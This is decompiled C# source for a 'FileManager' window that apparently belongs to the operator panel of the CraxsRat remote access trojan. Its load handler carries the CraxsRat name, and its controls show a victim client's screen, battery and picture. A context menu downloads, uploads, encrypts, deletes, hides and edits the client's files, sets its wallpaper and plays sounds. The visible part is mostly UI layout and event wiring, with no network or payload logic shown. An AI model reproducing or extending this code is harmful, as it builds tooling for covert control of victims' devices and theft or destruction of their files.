			EventHandler value2 = DrakeUIButtonIcon6_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon6 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon6;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon7
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon7;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon7_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon7 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon7;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIButtonIcon DrakeUIButtonIcon8
	{
		[CompilerGenerated]
		get
		{
			return _DrakeUIButtonIcon8;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon8_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_DrakeUIButtonIcon8 = value;
			drakeUIButtonIcon = _DrakeUIButtonIcon8;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIDataGridView DGV0
	{
		[CompilerGenerated]
		get
		{
			return _DGV0;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			DataGridViewSortCompareEventHandler value2 = DGV0_SortCompare;
			DataGridViewCellMouseEventHandler value3 = DGV0_CellMouseDoubleClick;
			EventHandler value4 = DGV0_SelectionChanged;
			DrakeUIDataGridView drakeUIDataGridView = _DGV0;
			if (drakeUIDataGridView != null)
			{
				drakeUIDataGridView.SortCompare -= value2;
				drakeUIDataGridView.CellMouseDoubleClick -= value3;
				drakeUIDataGridView.SelectionChanged -= value4;
			}
			_DGV0 = value;
			drakeUIDataGridView = _DGV0;
			if (drakeUIDataGridView != null)
			{
				drakeUIDataGridView.SortCompare += value2;
				drakeUIDataGridView.CellMouseDoubleClick += value3;
				drakeUIDataGridView.SelectionChanged += value4;
			}
		}
	}

	[field: AccessedThroughProperty("typ")]
	internal virtual DataGridViewTextBoxColumn typ
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("nam")]
	internal virtual DataGridViewTextBoxColumn nam
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("siz")]
	internal virtual DataGridViewTextBoxColumn siz
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("mofdat")]
	internal virtual DataGridViewTextBoxColumn mofdat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("dat")]
	internal virtual DataGridViewTextBoxColumn dat
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("ic")]
	internal virtual DataGridViewImageColumn ic
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Panel3")]
	internal virtual Panel Panel3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon cancelbtn
	{
		[CompilerGenerated]
		get
		{
			return _cancelbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = DrakeUIButtonIcon1_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _cancelbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_cancelbtn = value;
			drakeUIButtonIcon = _cancelbtn;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("DrakeWidth_W4")]
	internal virtual DrakeWidth_W DrakeWidth_W4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W3")]
	internal virtual DrakeWidth_W DrakeWidth_W3
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("DrakeWidth_W2")]
	internal virtual DrakeWidth_W DrakeWidth_W2
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("pathtxt")]
	internal virtual DrakeUITextBox pathtxt
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon ClearButton
	{
		[CompilerGenerated]
		get
		{
			return _ClearButton;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = ClearButton_Click_1;
			DrakeUIButtonIcon drakeUIButtonIcon = _ClearButton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_ClearButton = value;
			drakeUIButtonIcon = _ClearButton;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar clearsrchbtn
	{
		[CompilerGenerated]
		get
		{
			return _clearsrchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Clearsrchbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _clearsrchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_clearsrchbtn = value;
			drakeUIAvatar = _clearsrchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	internal virtual DrakeUITextBox searchtext
	{
		[CompilerGenerated]
		get
		{
			return _searchtext;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Searchtext_TextChanged;
			DrakeUITextBox drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged -= value2;
			}
			_searchtext = value;
			drakeUITextBox = _searchtext;
			if (drakeUITextBox != null)
			{
				drakeUITextBox.TextChanged += value2;
			}
		}
	}

	internal virtual DrakeUIAvatar searchbtn
	{
		[CompilerGenerated]
		get
		{
			return _searchbtn;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = Searchbtn_Click;
			DrakeUIAvatar drakeUIAvatar = _searchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click -= value2;
			}
			_searchbtn = value;
			drakeUIAvatar = _searchbtn;
			if (drakeUIAvatar != null)
			{
				drakeUIAvatar.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Panel4")]
	internal virtual Panel Panel4
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("Label1")]
	internal virtual Label Label1
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	[field: AccessedThroughProperty("thumb_chk")]
	internal virtual DrakeUICheckBox thumb_chk
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	internal virtual DrakeUIButtonIcon Downpic
	{
		[CompilerGenerated]
		get
		{
			return _Downpic;
		}
		[MethodImpl(MethodImplOptions.Synchronized)]
		[CompilerGenerated]
		set
		{
			EventHandler value2 = MetroSetBadge1_Click;
			DrakeUIButtonIcon drakeUIButtonIcon = _Downpic;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click -= value2;
			}
			_Downpic = value;
			drakeUIButtonIcon = _Downpic;
			if (drakeUIButtonIcon != null)
			{
				drakeUIButtonIcon.Click += value2;
			}
		}
	}

	[field: AccessedThroughProperty("Downloadnum")]
	internal virtual Label Downloadnum
	{
		get; [MethodImpl(MethodImplOptions.Synchronized)]
		set;
	}

	public FileManager()
	{
		base.Load += CraxsRatkfvuiorkenfudpajrsnCraxsRatsxcaxca;
		base.FormClosing += FileManager_FormClosing;
		Title = "null";
		ver = "n/a";
		Correntindex = -1;
		paths_indexs = new Collection();
		FSize = "Large text editing is not allowed {1}  -->{0}";
		Q = "20";
		ShowVideo = false;
		DownStreams = new Collection();
		FileDirectory = reso.res_Path + "\\Thumbs";
		Clipboard = new List<Array>();
		isfront = false;
		tempImage = new PictureBox();
		searchbefore = new List<DataGridViewRow>();
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if (disposing && components != null)
			{
				components.Dispose();
			}
		}
		finally
		{
			base.Dispose(disposing);
		}
	}

	[System.Diagnostics.DebuggerStepThrough]
	private void InitializeComponent()
	{
		this.components = new System.ComponentModel.Container();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle2 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle3 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle4 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle5 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle6 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle7 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle8 = new System.Windows.Forms.DataGridViewCellStyle();
		System.Windows.Forms.DataGridViewCellStyle dataGridViewCellStyle9 = new System.Windows.Forms.DataGridViewCellStyle();
		this.ctxMenu = new System.Windows.Forms.ContextMenuStrip(this.components);
		this.OpenToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CopyToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.CutToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PasteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DownloadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UploadToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EncryptToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DecodeToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ZipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.UnZipToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.DeleteToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.AddFilesToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.RenameToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.EditToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.HideToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.ShowToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.SetWallpaperToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.PlaySoundToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FolderDownloadsToolStripMenuItem = new System.Windows.Forms.ToolStripMenuItem();
		this.FilesUpload = new System.Windows.Forms.OpenFileDialog();
		this.TOpacity = new System.Windows.Forms.Timer(this.components);
		this.ThumbsCont = new System.Windows.Forms.Label();
		this.Panel1 = new System.Windows.Forms.Panel();
		this.DGV0 = new DrakeUI.Framework.DrakeUIDataGridView();
		this.typ = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.nam = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.siz = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.mofdat = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.dat = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ic = new System.Windows.Forms.DataGridViewImageColumn();
		this.DGVDATA = new System.Windows.Forms.DataGridView();
		this.N = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.P = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.S = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.D = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.ST = new System.Windows.Forms.DataGridViewTextBoxColumn();
		this.Panel6 = new System.Windows.Forms.Panel();
		this.Label1 = new System.Windows.Forms.Label();
		this.seentext = new System.Windows.Forms.Label();
		this.Selecttext = new System.Windows.Forms.Label();
		this.CountText = new System.Windows.Forms.Label();
		this.Panel3 = new System.Windows.Forms.Panel();
		this.Downloadnum = new System.Windows.Forms.Label();
		this.Downpic = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.thumb_chk = new DrakeUI.Framework.DrakeUICheckBox();
		this.ClearButton = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.cancelbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W4 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W3 = new DrakeUI.Framework.DrakeWidth_W();
		this.DrakeWidth_W2 = new DrakeUI.Framework.DrakeWidth_W();
		this.viwimage = new System.Windows.Forms.PictureBox();
		this.usrscreen = new System.Windows.Forms.PictureBox();
		this.Usrbtry = new System.Windows.Forms.PictureBox();
		this.sdbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.dcmbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.ClientPic = new System.Windows.Forms.PictureBox();
		this.picbtn = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.Panel4 = new System.Windows.Forms.Panel();
		this.DrakeUIButtonIcon7 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon8 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon6 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.clinumb = new System.Windows.Forms.Label();
		this.Timer1 = new System.Windows.Forms.Timer(this.components);
		this.Label2 = new System.Windows.Forms.Label();
		this.Panel2 = new System.Windows.Forms.Panel();
		this.pathtxt = new DrakeUI.Framework.DrakeUITextBox();
		this.clearsrchbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.searchtext = new DrakeUI.Framework.DrakeUITextBox();
		this.searchbtn = new DrakeUI.Framework.DrakeUIAvatar();
		this.DrakeUIButtonIcon5 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeUIButtonIcon4 = new DrakeUI.Framework.DrakeUIButtonIcon();
		this.DrakeWidth_W1 = new DrakeUI.Framework.DrakeWidth_W();
		this.PB = new System.Windows.Forms.ProgressBar();
		this.Timer2 = new System.Windows.Forms.Timer(this.components);
		this.ctxMenu.SuspendLayout();
		this.Panel1.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.DGV0).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.DGVDATA).BeginInit();
		this.Panel6.SuspendLayout();
		this.Panel3.SuspendLayout();
		((System.ComponentModel.ISupportInitialize)this.viwimage).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.usrscreen).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.Usrbtry).BeginInit();
		((System.ComponentModel.ISupportInitialize)this.ClientPic).BeginInit();
		this.Panel4.SuspendLayout();
		this.Panel2.SuspendLayout();
		base.SuspendLayout();
		this.ctxMenu.ImageScalingSize = new System.Drawing.Size(20, 20);
		this.ctxMenu.Items.AddRange(new System.Windows.Forms.ToolStripItem[19]
		{
			this.OpenToolStripMenuItem, this.CopyToolStripMenuItem, this.CutToolStripMenuItem, this.PasteToolStripMenuItem, this.DownloadToolStripMenuItem, this.UploadToolStripMenuItem, this.EncryptToolStripMenuItem, this.DecodeToolStripMenuItem, this.ZipToolStripMenuItem, this.UnZipToolStripMenuItem,
			this.DeleteToolStripMenuItem, this.AddFilesToolStripMenuItem, this.RenameToolStripMenuItem, this.EditToolStripMenuItem, this.HideToolStripMenuItem, this.ShowToolStripMenuItem, this.SetWallpaperToolStripMenuItem, this.PlaySoundToolStripMenuItem, this.FolderDownloadsToolStripMenuItem
		});
		this.ctxMenu.Name = "ctxMenu";
		this.ctxMenu.Size = new System.Drawing.Size(170, 460);
		this.OpenToolStripMenuItem.Name = "OpenToolStripMenuItem";
		this.OpenToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.OpenToolStripMenuItem.Text = "Open";
		this.CopyToolStripMenuItem.Name = "CopyToolStripMenuItem";
		this.CopyToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.C | System.Windows.Forms.Keys.Control;
		this.CopyToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.CopyToolStripMenuItem.Text = "Copy";
		this.CutToolStripMenuItem.Name = "CutToolStripMenuItem";
		this.CutToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.X | System.Windows.Forms.Keys.Control;
		this.CutToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.CutToolStripMenuItem.Text = "Cut";
		this.PasteToolStripMenuItem.Name = "PasteToolStripMenuItem";
		this.PasteToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.V | System.Windows.Forms.Keys.Control;
		this.PasteToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.PasteToolStripMenuItem.Text = "Paste";
		this.DownloadToolStripMenuItem.Name = "DownloadToolStripMenuItem";
		this.DownloadToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.DownloadToolStripMenuItem.Text = "Download";
		this.UploadToolStripMenuItem.Name = "UploadToolStripMenuItem";
		this.UploadToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.UploadToolStripMenuItem.Text = "Upload";
		this.EncryptToolStripMenuItem.Name = "EncryptToolStripMenuItem";
		this.EncryptToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.EncryptToolStripMenuItem.Text = "Encrypt";
		this.DecodeToolStripMenuItem.Name = "DecodeToolStripMenuItem";
		this.DecodeToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.DecodeToolStripMenuItem.Text = "Decode";
		this.ZipToolStripMenuItem.Name = "ZipToolStripMenuItem";
		this.ZipToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.ZipToolStripMenuItem.Text = "Zip";
		this.UnZipToolStripMenuItem.Name = "UnZipToolStripMenuItem";
		this.UnZipToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.UnZipToolStripMenuItem.Text = "UnZip";
		this.DeleteToolStripMenuItem.Name = "DeleteToolStripMenuItem";
		this.DeleteToolStripMenuItem.ShortcutKeys = System.Windows.Forms.Keys.Delete;
		this.DeleteToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.DeleteToolStripMenuItem.Text = "Delete";
		this.AddFilesToolStripMenuItem.Name = "AddFilesToolStripMenuItem";
		this.AddFilesToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.AddFilesToolStripMenuItem.Text = "Add Files";
		this.RenameToolStripMenuItem.Name = "RenameToolStripMenuItem";
		this.RenameToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.RenameToolStripMenuItem.Text = "Rename";
		this.EditToolStripMenuItem.Name = "EditToolStripMenuItem";
		this.EditToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.EditToolStripMenuItem.Text = "Edit";
		this.HideToolStripMenuItem.Name = "HideToolStripMenuItem";
		this.HideToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.HideToolStripMenuItem.Text = "Hidden";
		this.ShowToolStripMenuItem.Name = "ShowToolStripMenuItem";
		this.ShowToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.ShowToolStripMenuItem.Text = "UnHidden";
		this.SetWallpaperToolStripMenuItem.Name = "SetWallpaperToolStripMenuItem";
		this.SetWallpaperToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.SetWallpaperToolStripMenuItem.Text = "Set wallpaper";
		this.PlaySoundToolStripMenuItem.Name = "PlaySoundToolStripMenuItem";
		this.PlaySoundToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.PlaySoundToolStripMenuItem.Text = "Play sound";
		this.FolderDownloadsToolStripMenuItem.Name = "FolderDownloadsToolStripMenuItem";
		this.FolderDownloadsToolStripMenuItem.Size = new System.Drawing.Size(169, 24);
		this.FolderDownloadsToolStripMenuItem.Text = "Downloads";
		this.FilesUpload.FileName = "OpenFileDialog1";
		this.TOpacity.Interval = 1;
		this.ThumbsCont.AutoSize = true;
		this.ThumbsCont.BackColor = System.Drawing.Color.Transparent;
		this.ThumbsCont.Font = new System.Drawing.Font("Calibri", 9f);
		this.ThumbsCont.ForeColor = System.Drawing.Color.SkyBlue;
		this.ThumbsCont.Location = new System.Drawing.Point(68, 188);
		this.ThumbsCont.Name = "ThumbsCont";
		this.ThumbsCont.Size = new System.Drawing.Size(83, 18);
		this.ThumbsCont.TabIndex = 8;
		this.ThumbsCont.Text = "Use Thumbs";
		this.Panel1.BackColor = System.Drawing.Color.FromArgb(237, 237, 235);
		this.Panel1.Controls.Add(this.DGV0);
		this.Panel1.Controls.Add(this.DGVDATA);
		this.Panel1.Controls.Add(this.Panel6);
		this.Panel1.Dock = System.Windows.Forms.DockStyle.Fill;
		this.Panel1.Location = new System.Drawing.Point(179, 51);
		this.Panel1.Margin = new System.Windows.Forms.Padding(3, 4, 3, 4);
		this.Panel1.Name = "Panel1";
		this.Panel1.Size = new System.Drawing.Size(837, 799);
		this.Panel1.TabIndex = 0;
		this.DGV0.AllowUserToAddRows = false;
		this.DGV0.AllowUserToDeleteRows = false;
		dataGridViewCellStyle.BackColor = System.Drawing.Color.Black;
		this.DGV0.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle;
		this.DGV0.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGV0.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGV0.BackgroundColor = System.Drawing.Color.FromArgb(20, 20, 20);
		this.DGV0.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGV0.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.Single;
		dataGridViewCellStyle2.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleCenter;
		dataGridViewCellStyle2.BackColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle2.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle2.SelectionBackColor = System.Drawing.SystemColors.Highlight;
		dataGridViewCellStyle2.SelectionForeColor = System.Drawing.SystemColors.HighlightText;
		dataGridViewCellStyle2.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGV0.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle2;
		this.DGV0.ColumnHeadersHeight = 32;
		this.DGV0.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.DisableResizing;
		this.DGV0.Columns.AddRange(this.typ, this.nam, this.siz, this.mofdat, this.dat, this.ic);
		this.DGV0.ContextMenuStrip = this.ctxMenu;
		dataGridViewCellStyle3.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle3.BackColor = System.Drawing.Color.FromArgb(45, 45, 45);
		dataGridViewCellStyle3.Font = new System.Drawing.Font("Calibri", 12f);
		dataGridViewCellStyle3.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle3.SelectionBackColor = System.Drawing.Color.White;
		dataGridViewCellStyle3.SelectionForeColor = System.Drawing.Color.FromArgb(48, 48, 48);
		dataGridViewCellStyle3.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGV0.DefaultCellStyle = dataGridViewCellStyle3;
		this.DGV0.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGV0.EnableHeadersVisualStyles = false;
		this.DGV0.Font = new System.Drawing.Font("Calibri", 12f);
		this.DGV0.GridColor = System.Drawing.Color.SkyBlue;
		this.DGV0.Location = new System.Drawing.Point(0, 0);
		this.DGV0.Name = "DGV0";
		this.DGV0.ReadOnly = true;
		this.DGV0.RectColor = System.Drawing.Color.SkyBlue;
		this.DGV0.RowHeadersVisible = false;
		dataGridViewCellStyle4.BackColor = System.Drawing.Color.Black;
		this.DGV0.RowsDefaultCellStyle = dataGridViewCellStyle4;
		this.DGV0.RowTemplate.Height = 29;
		this.DGV0.SelectedIndex = -1;
		this.DGV0.SelectionMode = System.Windows.Forms.DataGridViewSelectionMode.FullRowSelect;
		this.DGV0.Size = new System.Drawing.Size(837, 774);
		this.DGV0.StripeEvenColor = System.Drawing.Color.Black;
		this.DGV0.StripeOddColor = System.Drawing.Color.Black;
		this.DGV0.Style = DrakeUI.Framework.UIStyle.Custom;
		this.DGV0.StyleCustomMode = true;
		this.DGV0.TabIndex = 14;
		this.typ.FillWeight = 50f;
		this.typ.HeaderText = "Type";
		this.typ.Name = "typ";
		this.typ.ReadOnly = true;
		this.nam.FillWeight = 70f;
		this.nam.HeaderText = "Name";
		this.nam.Name = "nam";
		this.nam.ReadOnly = true;
		this.siz.FillWeight = 45f;
		this.siz.HeaderText = "Size";
		this.siz.Name = "siz";
		this.siz.ReadOnly = true;
		this.mofdat.FillWeight = 60f;
		this.mofdat.HeaderText = "Modified-Date";
		this.mofdat.Name = "mofdat";
		this.mofdat.ReadOnly = true;
		this.dat.FillWeight = 50f;
		this.dat.HeaderText = "Date";
		this.dat.Name = "dat";
		this.dat.ReadOnly = true;
		this.ic.FillWeight = 45f;
		this.ic.HeaderText = "";
		this.ic.Name = "ic";
		this.ic.ReadOnly = true;
		this.DGVDATA.AllowUserToAddRows = false;
		this.DGVDATA.AllowUserToDeleteRows = false;
		this.DGVDATA.AllowUserToResizeColumns = false;
		this.DGVDATA.AllowUserToResizeRows = false;
		dataGridViewCellStyle5.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle5.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle5.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle5.SelectionBackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle5.SelectionForeColor = System.Drawing.Color.White;
		this.DGVDATA.AlternatingRowsDefaultCellStyle = dataGridViewCellStyle5;
		this.DGVDATA.AutoSizeColumnsMode = System.Windows.Forms.DataGridViewAutoSizeColumnsMode.Fill;
		this.DGVDATA.AutoSizeRowsMode = System.Windows.Forms.DataGridViewAutoSizeRowsMode.AllCells;
		this.DGVDATA.BackgroundColor = System.Drawing.Color.FromArgb(35, 35, 35);
		this.DGVDATA.BorderStyle = System.Windows.Forms.BorderStyle.None;
		this.DGVDATA.CellBorderStyle = System.Windows.Forms.DataGridViewCellBorderStyle.None;
		this.DGVDATA.ClipboardCopyMode = System.Windows.Forms.DataGridViewClipboardCopyMode.EnableWithoutHeaderText;
		this.DGVDATA.ColumnHeadersBorderStyle = System.Windows.Forms.DataGridViewHeaderBorderStyle.None;
		dataGridViewCellStyle6.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle6.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle6.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle6.ForeColor = System.Drawing.Color.SkyBlue;
		dataGridViewCellStyle6.SelectionBackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle6.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle6.WrapMode = System.Windows.Forms.DataGridViewTriState.True;
		this.DGVDATA.ColumnHeadersDefaultCellStyle = dataGridViewCellStyle6;
		this.DGVDATA.ColumnHeadersHeightSizeMode = System.Windows.Forms.DataGridViewColumnHeadersHeightSizeMode.AutoSize;
		this.DGVDATA.Columns.AddRange(this.N, this.P, this.S, this.D, this.ST);
		this.DGVDATA.ContextMenuStrip = this.ctxMenu;
		dataGridViewCellStyle7.Alignment = System.Windows.Forms.DataGridViewContentAlignment.MiddleLeft;
		dataGridViewCellStyle7.BackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle7.Font = new System.Drawing.Font("Calibri", 8.25f, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, 0);
		dataGridViewCellStyle7.ForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.SelectionBackColor = System.Drawing.Color.FromArgb(35, 35, 35);
		dataGridViewCellStyle7.SelectionForeColor = System.Drawing.Color.White;
		dataGridViewCellStyle7.WrapMode = System.Windows.Forms.DataGridViewTriState.False;
		this.DGVDATA.DefaultCellStyle = dataGridViewCellStyle7;
		this.DGVDATA.Dock = System.Windows.Forms.DockStyle.Fill;
		this.DGVDATA.EditMode = System.Windows.Forms.DataGridViewEditMode.EditProgrammatically;
